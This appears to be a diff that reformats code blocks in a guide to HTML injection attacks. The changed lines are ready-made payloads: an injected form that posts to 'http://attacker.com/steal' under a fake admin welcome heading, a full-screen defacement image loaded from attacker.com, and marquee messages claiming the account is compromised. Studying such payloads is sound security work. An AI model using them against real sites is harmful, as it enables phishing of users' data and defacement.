@@ -174,7 +174,9 @@ http://target.com/welcome?name=
 <h1>Welcome%20Admin</h1>
 <form%20action ="http://attacker.com/steal">
   <!-- Search result injection -->
-  http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee></form%20action
+  http://target.com/search?q=<marquee>
+    Your%20account%20has%20been%20compromised
+  </marquee></form%20action
 >
 ```
 
@@ -270,10 +272,15 @@ Website appearance manipulation:
 </body>
 
 <!-- Image injection -->
-<img src="http://attacker.com/defaced.jpg" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999" />
+<img
+  src="http://attacker.com/defaced.jpg"
+  style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"
+/>
 
 <!-- Marquee injection (visible movement) -->
-<marquee behavior="alternate" style="font-size:50px;color:red;">SECURITY VULNERABILITY DETECTED</marquee>
+<marquee behavior="alternate" style="font-size:50px;color:red;">
+  SECURITY VULNERABILITY DETECTED
+</marquee>
 ```
 
 ### Phase 7: Advanced Injection Techniques
